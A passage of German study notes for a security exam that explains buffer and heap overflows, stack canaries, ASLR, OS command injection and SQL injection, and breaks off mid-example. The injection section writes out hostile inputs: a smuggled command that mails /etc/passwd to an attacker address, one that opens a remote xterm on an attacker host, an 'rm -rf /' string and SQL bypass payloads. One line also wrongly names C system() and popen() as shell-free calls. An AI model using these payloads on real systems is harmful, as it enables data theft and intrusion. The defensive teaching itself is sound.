<p><strong>Konsequenzen eines Buffer Overflows</strong>:</p>
<ul>
<li>Ein Buffer Overflow kann den Speicher direkt hinter dem Puffer überschreiben. In einem realen Szenario könnte dies kritische Variablen, Funktionszeiger oder Rücksprungadressen überschreiben.</li>
<li>Ein Angreifer könnte diesen Überlauf ausnutzen, um schädlichen Code auszuführen oder die Kontrolle über das Programm zu übernehmen.</li>
</ul>
</li>
</ol><h3 id="Abbildung-Beispiel"><a class="anchor hidden-xs" href="#Abbildung-Beispiel" title="Abbildung-Beispiel"><i class="fa fa-link"></i></a>Abbildung Beispiel</h3><p>Die Abbildung zeigt den Zustand vor und nach einem Buffer Overflow. Vor dem Angriff ist der Speicher ordnungsgemäß aufgeteilt, aber nach dem Angriff wird der Puffer über seine Grenzen hinaus überschrieben, was zu Korruption des angrenzenden Speichers führt. In dem Fall konnte die Variable <code>authentificated</code> überschrieben werden, um sich Zugriff zu verschaffen.</p><h2 id="tip1"><a class="anchor hidden-xs" href="#tip1" title="tip1"><i class="fa fa-link"></i></a><img src="https://codi.ide3.de/uploads/upload_34cf188d484d4cccf97123449752ebd7.png" width="75%"></h2><p><img src="https://codi.ide3.de/uploads/upload_edef3812b733679c4c9f36a0b5a0e9dc.png" width="75%"></p><h3 id="Vermeidung-von-Buffer-Overflows"><a class="anchor hidden-xs" href="#Vermeidung-von-Buffer-Overflows" title="Vermeidung-von-Buffer-Overflows"><i class="fa fa-link"></i></a>Vermeidung von Buffer Overflows</h3><p>Um Buffer Overflows zu vermeiden, sollte man sicherstellen, dass die Daten nicht über die Puffergröße hinausgehen. Eine sichere Alternative zu <code>sprintf</code> ist <code>snprintf</code>, die eine maximale Anzahl von Zeichen angibt:</p><pre><code class="c hljs">snprintf(<span class="hljs-name">buffer</span>, sizeof(<span class="hljs-name">buffer</span>), <span class="hljs-string">"Incorrect password for user %s\n"</span>, username)<span class="hljs-comment">;</span>
</code></pre><p>Dies stellt sicher, dass nicht mehr als <code>sizeof(buffer)</code> Zeichen in den Puffer geschrieben werden, was einen Overflow verhindert.</p><p>Ein Buffer Overflow tritt auf, wenn mehr Daten in einen Speicherpuffer geschrieben werden, als dieser aufnehmen kann. In deinem Beispiel könnte ein langer Benutzername den <code>buffer</code> überschreiben und potenziell den Speicher beschädigen oder ausgenutzt werden, um schädlichen Code auszuführen. Die Verwendung von sicheren Funktionen wie <code>snprintf</code> kann solche Überläufe verhindern.</p><h2 id="Shellcode"><a class="anchor hidden-xs" href="#Shellcode" title="Shellcode"><i class="fa fa-link"></i></a>Shellcode</h2><p>Shellcode ist eine spezielle Art von Maschinencode (Assembler bzw. Nullen und Einsen), der in Exploits verwendet wird, um die Kontrolle über ein Zielsystem zu erlangen.</p><p>In Bezug auf Buffer Overflows wird Shellcode typischerweise in den überlaufenden Puffer injiziert. Wenn der Buffer Overflow erfolgreich ausgenutzt wird, überschreibt er kritische Speicherbereiche wie die Rücksprungadresse.</p><p>Dadurch kann der Angreifer den Programmfluss umleiten, um den injizierten Shellcode auszuführen, was oft zu einer Shell oder einem anderen privilegierten Zugriff führt.</p><h2 id="NOP-Sled"><a class="anchor hidden-xs" href="#NOP-Sled" title="NOP-Sled"><i class="fa fa-link"></i></a>NOP Sled</h2><p>Schwierigkeiten bei der Korruption lokaler Variablen:</p><ul>
<li>Die Position von Variablen im Speicher ist nicht immer bekannt da Speicheradressen zwischen Aufrufen variieren können.</li>
<li>C-Compiler legen keine festen Stapel-Layouts fest</li>
<li>Optimierungen durch den Compiler können die Anordnung von Code beeinflussen.</li>
<li>Die Korruption von Informationen in jedem Stapelrahmen (z. B. Frame-Pointer und</li>
<li>Rückgabeadresse) kann das Verhalten von Anwendungen beeinflussen.</li>
<li>Die genaue Adresse des Angriffscodes im Stack ist schwer zu erraten.</li>
</ul><p><strong>NOP Sled</strong>:</p><ul>
<li>Eine Technik, um Buffer Overflow Exploits zu erleichtern</li>
<li>Besteht aus vielen <code>NOP</code> (No Operation) Anweisungen</li>
<li><code>NOP</code> Anweisung: Führt keine Operation aus, geht einfach zur nächsten Anweisung</li>
<li>Platziert vor dem Shellcode im Speicher</li>
<li>Erhöht die Wahrscheinlichkeit, den Shellcode zu treffen, wenn der Programmfluss umgeleitet wird</li>
<li>Da NOPs keine Operation ausführen, gleitet das Programm durch den NOP Sled und erreicht schließlich den Shellcode.</li>
<li>Beispiel: Zieladresse irgendwo im NOP Sled, führt sicher zum Shellcode</li>
</ul><h2 id="Heapoverflow"><a class="anchor hidden-xs" href="#Heapoverflow" title="Heapoverflow"><i class="fa fa-link"></i></a>Heapoverflow</h2><p>Betrachte folgendes Beispiel:</p><pre><code class="c hljs">char *user = (<span class="hljs-name">char</span> *)malloc(sizeof(char) * <span class="hljs-number">8</span>)<span class="hljs-comment">;</span>
char *adminuser = (<span class="hljs-name">char</span> *)malloc(sizeof(char) * <span class="hljs-number">8</span>)<span class="hljs-comment">;</span>
strcpy(<span class="hljs-name">adminuser</span>, <span class="hljs-string">"root"</span>)<span class="hljs-comment">;</span>
if (<span class="hljs-name">argc</span> &gt; <span class="hljs-number">1</span>)
    strcpy(<span class="hljs-name">user</span>, argv[<span class="hljs-number">1</span>])<span class="hljs-comment">;</span>
else
    strcpy(<span class="hljs-name">user</span>, <span class="hljs-string">"guest"</span>)<span class="hljs-comment">;</span>
/* Now we'll do ordinary operations as <span class="hljs-string">"user"</span> and
createsensitive systemfilesas <span class="hljs-string">"adminuser"</span> */
</code></pre><p>Ein Heap Overflow tritt auf, wenn mehr Daten in einen dynamisch allokierten Speicherbereich geschrieben werden, als dieser aufnehmen kann. Im gegebenen Beispiel könnte eine zu lange Eingabe über <code>argv[1]</code> dazu führen, dass der Speicher für <code>user</code> überschrieben wird, was potenziell auch <code>adminuser</code> gefährdet. Dies kann zu schwerwiegenden Sicherheitsproblemen führen und sollte durch sicheres Programmieren und die Verwendung von sichereren Funktionen vermieden werden.</p><ol>
<li>
<p><strong>Speicherzuweisung</strong>:</p>
<ul>
<li>Zwei Speicherbereiche werden dynamisch allokiert: <code>user</code> und <code>adminuser</code>, beide jeweils 8 Bytes groß.</li>
</ul>
</li>
<li>
<p><strong>Datenkopieren</strong>:</p>
<ul>
<li>Der String “root” wird in den Speicherbereich <code>adminuser</code> kopiert.</li>
<li>Der Inhalt von <code>argv[1]</code> (erster Kommandozeilenparameter) oder “guest” wird in den Speicherbereich <code>user</code> kopiert, abhängig davon, ob <code>argc</code> größer als 1 ist.</li>
</ul>
</li>
<li>
<p><strong>Potenzielle Heap Overflow Schwachstelle</strong>:</p>
<ul>
<li>Das Problem liegt in der Verwendung der Funktion <code>strcpy</code>, die keine Längenüberprüfung der Eingabe durchführt. Wenn der Inhalt von <code>argv[1]</code> länger als 7 Zeichen ist (wegen des Null-Terminators), kommt es zu einem Heap Overflow.</li>
</ul>
</li>
<li>
<p><strong>Konsequenzen eines Heap Overflows</strong>:</p>
<ul>
<li>Wenn <code>argv[1]</code> länger als 7 Zeichen ist, überschreibt <code>strcpy</code> den allokierten Speicher für <code>user</code>. Da <code>adminuser</code> direkt neben <code>user</code> im Heap liegen könnte, besteht die Gefahr, dass der Überlauf auch <code>adminuser</code> beeinflusst.</li>
<li>Dies kann dazu führen, dass der Inhalt von <code>adminuser</code> (z.B. “root”) überschrieben wird, was potenziell zu fehlerhaftem Verhalten oder Sicherheitslücken führt.</li>
</ul>
</li>
<li>
<p><strong>Schutz vor Heap Overflows</strong>:</p>
<ul>
<li>Verwenden sicherer Funktionen wie <code>strncpy</code> mit expliziter Angabe der maximalen Länge, um Überläufe zu verhindern:<pre><code class="c hljs">strncpy(user, argv[<span class="hljs-number">1</span>], <span class="hljs-number">7</span>); <span class="hljs-comment">// Kopiert höchstens 7 Zeichen</span>
user[<span class="hljs-number">7</span>] = '\<span class="hljs-number">0</span>'; <span class="hljs-comment">// Stellt sicher, dass der String korrekt nullterminiert ist</span>
</code></pre>
</li>
<li>Überprüfe die Länge der Eingabe, bevor sie kopiert wird, um sicherzustellen, dass sie nicht größer ist als der allokierte Speicher.</li>
</ul>
</li>
</ol><h2 id="Canaries"><a class="anchor hidden-xs" href="#Canaries" title="Canaries"><i class="fa fa-link"></i></a>Canaries</h2><p>Das Konzept von “Canaries” (auch bekannt als “Stack Canary” oder “Stack Guard”) ist eine Sicherheitsmaßnahme, die dazu dient, Buffer Overflows zu erkennen und zu verhindern. Hier eine kurze Erklärung:</p><ul>
<li>
<p><strong>Zweck</strong>: Canaries werden verwendet, um die Integrität des Stacks zu schützen und vor Pufferüberläufen zu warnen, die oft zur Ausnutzung von Sicherheitslücken führen.</p>
</li>
<li>
<p><strong>Funktionsweise</strong>:</p>
<ul>
<li>Beim Ausführen eines Programms wird vor der Rücksprungadresse (Return Address) auf dem Stack ein zufällig generierter Wert (Canary) platziert.</li>
<li>Dieser Canary-Wert dient als Marker, um zu überprüfen, ob der Stack während der Ausführung manipuliert wurde.</li>
</ul>
</li>
<li>
<p><strong>Überprüfung</strong>:</p>
<ul>
<li>Vor der Rückkehr von einer Funktion wird überprüft, ob der Canary-Wert unverändert ist.</li>
<li>Wenn der Canary-Wert durch einen Buffer Overflow verändert wurde, deutet dies darauf hin, dass der Stack manipuliert wurde, und das Programm kann gegebenenfalls einen Alarm auslösen oder sicherheitsrelevante Maßnahmen ergreifen, wie das Beenden des Programms.</li>
</ul>
</li>
<li>
<p><strong>Schutzmechanismus</strong>:</p>
<ul>
<li>Durch die Platzierung eines Canaries wird die Wahrscheinlichkeit verringert, dass ein Angreifer erfolgreich die Rückkehradresse manipulieren kann, um schädlichen Code auszuführen.</li>
<li>Der zufällig generierte Wert erschwert es einem Angreifer, den genauen Wert des Canaries vorherzusagen oder zu manipulieren.</li>
</ul>
</li>
<li>
<p><strong>Implementierung</strong>:</p>
<ul>
<li>Canaries werden häufig von Compilern automatisch eingefügt, insbesondere bei der Verwendung von Stack-Schutzmechanismen wie <code>-fstack-protector</code> in GCC.</li>
<li>Die Canaries können auch von Hand in Programmen implementiert werden, um die Sicherheit bei der Handhabung von Speicher zu erhöhen.</li>
</ul>
</li>
</ul><h2 id="Gegenmaßnahmen-zu-Overflows"><a class="anchor hidden-xs" href="#Gegenmaßnahmen-zu-Overflows" title="Gegenmaßnahmen-zu-Overflows"><i class="fa fa-link"></i></a>Gegenmaßnahmen zu Overflows</h2><ul>
<li>
<p><strong>Kanarienvögel</strong>:</p>
<ul>
<li>Platziert zufällige Werte (Canaries) vor kritischen Datenstrukturen wie der Rücksprungadresse auf dem Stack.</li>
<li>Überprüft vor der Rückkehr aus einer Funktion, ob der Canary-Wert unverändert ist, um Überläufe zu erkennen.</li>
<li>Angreifer versuchen, den Canary-Wert zu entdecken oder zu umgehen, z.B. durch Vorhersage der zufälligen Sequenz oder durch Exploits zur Übernahme des Canary-Werts.</li>
</ul>
</li>
<li>
<p><strong>Effektivität von Kanarienvögeln</strong>:</p>
<ul>
<li>Schützt nicht vor der Überschreibung lokaler Variablen, erfordert möglicherweise Neuanordnung der Variablen.</li>
<li>Angriffe können weiterhin Parameterüberschreibungen nutzen, um den Speicher zu manipulieren.</li>
</ul>
</li>
<li>
<p><strong>Return-to-libc und Return-Oriented Programming (ROP)</strong>:</p>
<ul>
<li>Nutzt vorhandenen ausführbaren Code für Angriffe.</li>
<li>Umgeht Kanarienvögel und NX (No-Execute-Bit).</li>
</ul>
</li>
</ul><p><strong>Control-Flow Integrity (CFI)</strong>:</p><ul>
<li>Effektiver Verteidigungsmechanismus, der sicherstellt, dass die Ausführung einem vorher festgelegten Aufrufgraphen folgt.</li>
<li>Kann ROP und ähnliche Angriffe abwehren, wenn präzise und feinkörnig durchgesetzt.</li>
</ul><h3 id="Speicherschutz-in-Betriebssystemen-und-Hardware"><a class="anchor hidden-xs" href="#Speicherschutz-in-Betriebssystemen-und-Hardware" title="Speicherschutz-in-Betriebssystemen-und-Hardware"><i class="fa fa-link"></i></a>Speicherschutz in Betriebssystemen und Hardware</h3><ul>
<li>Zäune (Fences): Trennen die Speicherzugriffe zwischen Betriebssystem und</li>
<li>Benutzercode (eine Grenze, einseitiger Schutz)</li>
<li>Basis- und Grenzregister (Base and bounds registers): Durchsetzen der Trennung  zwischen mehreren Programmen und ermöglichen Zugriffskontrolle auf  Speicherbereiche.</li>
<li>Tagged Architecture: Feingranularere Steuerung, Tags an jedem Speicherort setzen Zugriffsrechte (Lesen, Schreiben, Ausführen). Befehle im Supervisor-Modus sind erforderlich, um das Tag zu setzen. Derzeit in modernen Architekturen nicht unterstützt.</li>
</ul><ul>
<li><strong>Segmentierung und Paging</strong>:
<ul>
<li>Segmentierung und Paging teilen Programme in logische oder feste Teile auf dem Speicher auf, um Isolation und Sicherheit zu gewährleisten.</li>
<li>Nicht ausführbare Speicherseiten verhindern die Ausführung von Code in Datenbereichen.</li>
</ul>
</li>
</ul><h3 id="Weitere-Techniken-zum-Schutz-vor-Speicherkorruption"><a class="anchor hidden-xs" href="#Weitere-Techniken-zum-Schutz-vor-Speicherkorruption" title="Weitere-Techniken-zum-Schutz-vor-Speicherkorruption"><i class="fa fa-link"></i></a>Weitere Techniken zum Schutz vor Speicherkorruption</h3><ul>
<li>
<p><strong>Defensive Programmierung</strong>:</p>
<ul>
<li>Grenzprüfungen und Überprüfungen der Datenlängen zur Vermeidung von Überläufen und Indexüberschreitungen.</li>
</ul>
</li>
<li>
<p><strong>Diversifikation</strong>:</p>
<ul>
<li>Erzeugung vieler Versionen desselben Programms, um allgemeine Angriffe zu verhindern.</li>
<li>Address Space Layout Randomization (ASLR) randomisiert das Speicherlayout, um statische Positionen aufzubrechen und das Auffinden von Daten oder Code zu erschweren.</li>
</ul>
</li>
</ul><h2 id="Erkennen-von-Overflows"><a class="anchor hidden-xs" href="#Erkennen-von-Overflows" title="Erkennen-von-Overflows"><i class="fa fa-link"></i></a>Erkennen von Overflows</h2><p>In einer Klausur oder einer Prüfung gibt es bestimmte Anzeichen, auf die man achten kann, um Heap- und Bufferoverflows zu erkennen:</p><h3 id="Anzeichen-für-Bufferoverflows-in-Klausur"><a class="anchor hidden-xs" href="#Anzeichen-für-Bufferoverflows-in-Klausur" title="Anzeichen-für-Bufferoverflows-in-Klausur"><i class="fa fa-link"></i></a>Anzeichen für Bufferoverflows in Klausur:</h3><ol>
<li>
<p><strong>Verwendung unsicherer Funktionen</strong>: Verwendung von Funktionen wie <code>strcpy</code>, <code>strcat</code>, <code>sprintf</code> ohne Angabe einer maximalen Länge kann zu Bufferoverflows führen.</p>
</li>
<li>
<p><strong>Überprüfung von Eingabegrößen</strong>: Fehlende Überprüfung der Länge von Benutzereingaben, bevor sie in einen Puffer kopiert werden.</p>
</li>
<li>
<p><strong>Festgelegte Puffergrößen</strong>: Wenn die Puffergröße fest auf einen bestimmten Wert gesetzt ist und nicht dynamisch angepasst wird, könnte dies ein Hinweis auf einen potenziellen Overflow sein.</p>
</li>
<li>
<p><strong>Kopieren von Eingaben in Puffer ohne Längenüberprüfung</strong>: Direktes Kopieren von Benutzereingaben in einen Puffer ohne vorherige Überprüfung der Länge der Eingabe.</p>
</li>
<li>
<p><strong>Verwendung von Eingaben ohne Überprüfung</strong>: Verwendung von Benutzereingaben für Operationen ohne vorherige Überprüfung auf potenziell schädliche Zeichen oder Längen.</p>
</li>
</ol><h3 id="Anzeichen-für-Heapoverflows-in-Klausur"><a class="anchor hidden-xs" href="#Anzeichen-für-Heapoverflows-in-Klausur" title="Anzeichen-für-Heapoverflows-in-Klausur"><i class="fa fa-link"></i></a>Anzeichen für Heapoverflows in Klausur:</h3><ol>
<li>
<p><strong>Dynamische Speicherallokation</strong>: Verwendung von Funktionen wie <code>malloc</code>, <code>calloc</code>, <code>realloc</code> ohne Überprüfung der Allokationsgröße oder ohne Überprüfung der Eingabe, die zur Allokation verwendet wird.</p>
</li>
<li>
<p><strong>Ungenügende Speicherverwaltung</strong>: Fehlen von Maßnahmen zur Speicherverwaltung, die sicherstellen, dass keine Daten außerhalb der zugewiesenen Speicherbereiche geschrieben werden können.</p>
</li>
<li>
<p><strong>Überschreiten der zugewiesenen Speichergrenzen</strong>: Versuch, mehr Daten in einen allokierten Speicherbereich zu schreiben, als tatsächlich reserviert wurde.</p>
</li>
<li>
<p><strong>Mangelnde Freigabe von allokiertem Speicher</strong>: Vergessen, den allokierten Speicherbereich mit <code>free</code> freizugeben, was zu Speicherlecks oder unerwarteten Speicheroperationen führen kann.</p>
</li>
<li>
<p><strong>Fehlerhafte Pointeroperationen</strong>: Operationen mit Pointern, die auf bereits freigegebenen oder ungültigen Speicher zeigen könnten.</p>
</li>
</ol><h1 id="Code-Injection"><a class="anchor hidden-xs" href="#Code-Injection" title="Code-Injection"><i class="fa fa-link"></i></a>Code-Injection</h1><h3 id="Operating-System-Befehlsinjektion-Erklärung-und-Beispiel"><a class="anchor hidden-xs" href="#Operating-System-Befehlsinjektion-Erklärung-und-Beispiel" title="Operating-System-Befehlsinjektion-Erklärung-und-Beispiel"><i class="fa fa-link"></i></a>Operating System Befehlsinjektion: Erklärung und Beispiel</h3><h4 id="Was-ist-eine-OS-Befehlsinjektion"><a class="anchor hidden-xs" href="#Was-ist-eine-OS-Befehlsinjektion" title="Was-ist-eine-OS-Befehlsinjektion"><i class="fa fa-link"></i></a>Was ist eine OS-Befehlsinjektion?</h4><p>Eine OS-Befehlsinjektion ist eine Art von Sicherheitslücke, bei der ein Angreifer schädliche Systembefehle in eine Anwendung einschleusen kann. Diese Befehle werden oft von der Kommandozeile interpretiert und können das System manipulieren oder kompromittieren.</p><h4 id="Warum-passiert-das"><a class="anchor hidden-xs" href="#Warum-passiert-das" title="Warum-passiert-das"><i class="fa fa-link"></i></a>Warum passiert das?</h4><ul>
<li><strong>Fehlende Bibliotheken:</strong> Programmierer verwenden Systembefehle, weil ihre Programmiersprache keine geeigneten Bibliotheken hat.</li>
<li><strong>Bequemlichkeit:</strong> Es ist oft einfacher und schneller, Systembefehle zu verwenden, als Bibliotheken zu suchen und zu implementieren.</li>
</ul><h4 id="Beispielcode-in-Python"><a class="anchor hidden-xs" href="#Beispielcode-in-Python" title="Beispielcode-in-Python"><i class="fa fa-link"></i></a>Beispielcode in Python</h4><pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/python</span>
<span class="hljs-keyword">import</span> cgi, os
<span class="hljs-keyword">print</span> <span class="hljs-string">"Content-type: text/html"</span>
<span class="hljs-keyword">print</span>
form = cgi.FieldStorage()
message = form[<span class="hljs-string">"contents"</span>].value
recipient = form[<span class="hljs-string">"to"</span>].value
tmpfile = open(<span class="hljs-string">"/tmp/cgi-mail"</span>, <span class="hljs-string">"w"</span>)
tmpfile.write(message)
tmpfile.close()
os.system(<span class="hljs-string">"/usr/bin/sendmail "</span> + recipient + <span class="hljs-string">" &lt; /tmp/cgi-mail"</span>)
os.unlink(<span class="hljs-string">"/tmp/cgi-mail"</span>)
<span class="hljs-keyword">print</span> <span class="hljs-string">"&lt;html&gt;&lt;h3&gt;Message sent.&lt;/h3&gt;&lt;/html&gt;"</span>
</code></pre><h4 id="Normaler-Gebrauch"><a class="anchor hidden-xs" href="#Normaler-Gebrauch" title="Normaler-Gebrauch"><i class="fa fa-link"></i></a>Normaler Gebrauch:</h4><ul>
<li>Der Benutzer gibt eine gültige E-Mail-Adresse in ein Webformular ein.</li>
<li>Der Code sendet eine E-Mail an den angegebenen Empfänger mit dem Inhalt der Nachricht.</li>
</ul><h4 id="Missbrauch"><a class="anchor hidden-xs" href="#Missbrauch" title="Missbrauch"><i class="fa fa-link"></i></a>Missbrauch:</h4><p>Ein Angreifer kann die Eingabe manipulieren, um schädliche Befehle einzuschleusen, indem sie unzureichend überprüfte Benutzereingaben manipulieren.</p><h5 id="Beispiel-1"><a class="anchor hidden-xs" href="#Beispiel-1" title="Beispiel-1"><i class="fa fa-link"></i></a>Beispiel 1:</h5><p>Eingabe:</p><pre><code>attacker@hotmail.com &lt; /etc/passwd; #
</code></pre><p>Resultierender Befehl:</p><pre><code>/usr/bin/sendmail attacker@hotmail.com &lt; /etc/passwd; #
</code></pre><p>Dies sendet den Inhalt der Passwortdatei (<code>/etc/passwd</code>) an die angegebene E-Mail-Adresse.</p><h5 id="Beispiel-2"><a class="anchor hidden-xs" href="#Beispiel-2" title="Beispiel-2"><i class="fa fa-link"></i></a>Beispiel 2:</h5><p>Eingabe:</p><pre><code>attacker@hotmail.com &lt; /etc/passwd; export DISPLAY=proxy.attacker.org:0; /usr/X11R6/bin/xterm&amp;; #
</code></pre><p>Resultierender Befehl:</p><pre><code>/usr/bin/sendmail attacker@hotmail.com &lt; /etc/passwd; export DISPLAY=proxy.attacker.org:0; /usr/X11R6/bin/xterm&amp;; #
</code></pre><p>Dies sendet die Passwortdatei und öffnet ein Remote-Terminal auf dem Rechner des Angreifers.</p><h4 id="Metazeichen"><a class="anchor hidden-xs" href="#Metazeichen" title="Metazeichen"><i class="fa fa-link"></i></a>Metazeichen</h4><p>Metazeichen in Shell-Befehlen (z.B. <code>#</code>, <code>;</code>, <code>&amp;</code>) können von Angreifern verwendet werden, um die Struktur der Befehle zu ändern und zusätzliche, schädliche Befehle einzuschleusen.</p><h4 id="Vermeidung-von-OS-Befehlsinjektionen"><a class="anchor hidden-xs" href="#Vermeidung-von-OS-Befehlsinjektionen" title="Vermeidung-von-OS-Befehlsinjektionen"><i class="fa fa-link"></i></a>Vermeidung von OS-Befehlsinjektionen</h4><ul>
<li><strong>Eingabevalidierung:</strong> Überprüfen und bereinige alle Benutzereingaben.</li>
<li><strong>Sichere API-Aufrufe:</strong> Verwende Funktionen, die keine Shell aufrufen, wie <code>subprocess.run()</code> und call() in Python bzw. in C <code>system()</code> und <code>popen()</code>.</li>
<li><strong>Prinzip der geringsten Rechte:</strong> Anwendungen sollten mit minimalen Rechten ausgeführt werden, um Schäden zu begrenzen.</li>
</ul><h2 id="Erkennung-von-Injections-in-der-Klausur"><a class="anchor hidden-xs" href="#Erkennung-von-Injections-in-der-Klausur" title="Erkennung-von-Injections-in-der-Klausur"><i class="fa fa-link"></i></a>Erkennung von Injections in der Klausur</h2><ol>
<li>
<p><strong>Direkte Ausführung von Benutzereingaben:</strong></p>
<ul>
<li>Der Code verwendet Funktionen, die Benutzereingaben direkt ausführen oder verarbeiten.</li>
<li>Beispiel: <code>os.system()</code>, <code>eval()</code>, <code>exec()</code>, <code>popen()</code>.</li>
</ul>
</li>
<li>
<p><strong>Mangelnde Eingabevalidierung:</strong></p>
<ul>
<li>Es gibt keine oder unzureichende Überprüfung und Bereinigung von Benutzereingaben.</li>
<li>Beispiel: Rohübernahme von Formulardaten in Systembefehle oder Pipes.</li>
</ul>
</li>
<li>
<p><strong>Metazeichen und Sonderzeichen:</strong></p>
<ul>
<li>Der Code erlaubt die Eingabe von Metazeichen (wie <code>;</code>, <code>&amp;</code>, <code>|</code>, <code>&lt;</code>, <code>&gt;</code>), die die Ausführung von Befehlen beeinflussen können.</li>
<li>Beispiel: Einfügen von <code>"; rm -rf /"</code> in ein Eingabefeld.</li>
</ul>
</li>
<li>
<p><strong>Scripting und Shell-Kommandos:</strong></p>
<ul>
<li>Benutzereingaben werden in Skripten oder Shell-Kommandos verwendet.</li>
<li>Beispiel: <code>shell_exec("ls " . $input)</code></li>
</ul>
</li>
<li>
<p><strong>Dateioperationen:</strong></p>
<ul>
<li>Der Code führt Dateioperationen mit Benutzereingaben aus, ohne die Pfade zu überprüfen.</li>
<li>Beispiel: <code>open("/tmp/" + user_input)</code></li>
</ul>
</li>
</ol><h3 id="Zusammenfassung"><a class="anchor hidden-xs" href="#Zusammenfassung" title="Zusammenfassung"><i class="fa fa-link"></i></a>Zusammenfassung</h3><p>Um Injections im Code zu erkennen, achte auf:</p><ul>
<li>Direkte Ausführung oder Verarbeitung von Benutzereingaben.</li>
<li>Fehlende oder unzureichende Eingabevalidierung.</li>
<li>Verwendung von Metazeichen in Eingaben.</li>
<li>Direkte Einbettung von Eingaben in Shell-Kommandos oder Skripte.</li>
<li>Dateioperationen mit unüberprüften Pfaden.</li>
</ul><p>Diese Anzeichen deuten auf potenzielle Schwachstellen hin, die zu Injections führen können.</p><h2 id="Umgebungsvariablen-und-ihre-Risiken"><a class="anchor hidden-xs" href="#Umgebungsvariablen-und-ihre-Risiken" title="Umgebungsvariablen-und-ihre-Risiken"><i class="fa fa-link"></i></a>Umgebungsvariablen und ihre Risiken</h2><h4 id="Einfluss-von-Umgebungsvariablen-auf-Kommandos"><a class="anchor hidden-xs" href="#Einfluss-von-Umgebungsvariablen-auf-Kommandos" title="Einfluss-von-Umgebungsvariablen-auf-Kommandos"><i class="fa fa-link"></i></a>Einfluss von Umgebungsvariablen auf Kommandos</h4><ul>
<li><strong>Umgebungsvariablen sind eine Form der Eingabe:</strong> Sie können die Ausführung von Kommandos beeinflussen.</li>
<li><strong>Manipulationsgefahr:</strong> Ein Angreifer könnte in der Lage sein, diese Variablen zu ändern und so die Ausführung von Programmen zu manipulieren.</li>
</ul><h4 id="Beispiel-Untergrabung-des-PATH"><a class="anchor hidden-xs" href="#Beispiel-Untergrabung-des-PATH" title="Beispiel-Untergrabung-des-PATH"><i class="fa fa-link"></i></a>Beispiel: Untergrabung des PATH</h4><ul>
<li><strong>PATH-Variable:</strong> Definiert den Suchpfad für Programme.</li>
<li><strong>Risiko bei nicht expliziten Pfaden:</strong> Wenn Befehle ohne explizite Pfade aufgerufen werden, kann eine unerwartete (und möglicherweise bösartige) Version des Programms gefunden werden.</li>
</ul><h4 id="Beispiel-für-ein-altes-Unix-Standardverhalten"><a class="anchor hidden-xs" href="#Beispiel-für-ein-altes-Unix-Standardverhalten" title="Beispiel-für-ein-altes-Unix-Standardverhalten"><i class="fa fa-link"></i></a>Beispiel für ein altes Unix-Standardverhalten:</h4><ul>
<li><strong>Bequemlichkeit für Entwickler:</strong> Das aktuelle Arbeitsverzeichnis wurde an die erste Stelle im PATH gesetzt: <code>PATH=.: /bin:/usr/bin:/usr/local/bin</code>.</li>
<li><strong>Risiken dieses Ansatzes:</strong>
<ul>
<li><strong>Unvorhersehbarkeit:</strong> Programme aus dem aktuellen Verzeichnis könnten ungewollt ausgeführt werden.</li>
<li><strong>Sicherheitslücke:</strong> Angreifer könnten bösartige Programme im aktuellen Verzeichnis platzieren, die dann anstelle der legitimen Programme ausgeführt werden.</li>
</ul>
</li>
</ul><h1 id="SQL-Injections-SQLi"><a class="anchor hidden-xs" href="#SQL-Injections-SQLi" title="SQL-Injections-SQLi"><i class="fa fa-link"></i></a>SQL-Injections (SQLi)</h1><h4 id="Definition-und-Bedeutung"><a class="anchor hidden-xs" href="#Definition-und-Bedeutung" title="Definition-und-Bedeutung"><i class="fa fa-link"></i></a>Definition und Bedeutung</h4><ul>
<li><strong>SQL-Injection (SQLi):</strong> Eine Schwachstelle, bei der Angreifer durch Einschleusen von SQL-Befehlen in eine Anwendung unberechtigten Zugriff auf die Datenbank erhalten.</li>
<li><strong>Häufigkeit:</strong> Regelmäßig eine der am häufigsten genannten Software-Schwachstellen.</li>
<li><strong>OWASP:</strong> Identifiziert SQL-Injections als eine der größten Bedrohungen für Webanwendungen.</li>
</ul><h4 id="Funktionsweise-von-SQL-Injections"><a class="anchor hidden-xs" href="#Funktionsweise-von-SQL-Injections" title="Funktionsweise-von-SQL-Injections"><i class="fa fa-link"></i></a>Funktionsweise von SQL-Injections</h4><ul>
<li><strong>Einschleusen von SQL-Befehlen:</strong> Angreifer fügen bösartige SQL-Befehle in Eingabefelder ein, die dann von der Anwendung ausgeführt werden.</li>
<li><strong>Beispiel:</strong>
<ul>
<li><strong>Normale Abfrage:</strong> <code>SELECT * FROM users WHERE email = 'admin' AND pass = 'g3heim123'</code></li>
<li><strong>Manipulierte Abfrage:</strong> <code>SELECT * FROM users WHERE email = 'admin' OR '1'='1' AND pass = 'passwort123'</code></li>
<li>Ergebnis: Alle Datensätze werden zurückgegeben, da die Bedingung <code>OR '1'='1'</code> immer wahr ist.</li>
</ul>
</li>
<li><strong>Beispiel 2:</strong>
<ul>
<li><strong>Normale Nutzung:</strong> <code>SELECT accounts FROM users WHERE login='john' AND pin=1234</code></li>
<li><strong>Böswillige Nutzung:</strong> <code>SELECT accounts FROM users WHERE login='admin' --' AND pin=0</code></li>
<li>Ergebnis: Der Kommentar <code>--</code> deaktiviert den Rest der Abfrage, wodurch die Bedingung <code>AND pin=0</code> ignoriert wird.</li>
</ul>
</li>
</ul><h3 id="Klassifizierung-von-SQL-Injections"><a class="anchor hidden-xs" href="#Klassifizierung-von-SQL-Injections" title="Klassifizierung-von-SQL-Injections"><i class="fa fa-link"></i></a>Klassifizierung von SQL-Injections</h3><ul>
<li><strong>Injektionsroute:</strong>
<ul>
<li><strong>Netzwerk:</strong> Größeres Risiko durch viele unbekannte Benutzer.</li>
<li><strong>Lokal:</strong> Risiko durch Insider-Bedrohungen und Drive-by-Exploits.</li>
</ul>
</li>
<li><strong>Motive:</strong> Datenexfiltration, Umgehung von Authentifizierungen, Datenmanipulation.</li>
<li><strong>Arten von SQL-Injection-Codes:</strong>
<ul>
<li><strong>In-Band:</strong> Direkte Nutzung der Ergebnisse der SQL-Injektion.</li>
<li><strong>Out-of-Band:</strong> Nutzung separater Kommunikationskanäle.</li>
<li><strong>Inferential (Blind):</strong> Keine direkte Ausgabe der Ergebnisse, aber durch Seitenverhalten erkennbar.</li>
</ul>
</li>
</ul><p>Das gegebene Beispiel ist ein Java Servlet Code-Ausschnitt, der potenziell anfällig für SQL-Injection (SQLi) ist. Hier ist eine schrittweise Erläuterung, warum dies so ist:</p><pre><code class="java hljs"><span class="hljs-number">7</span> queryString = <span class="hljs-string">"SELECT info FROM users WHERE "</span>;
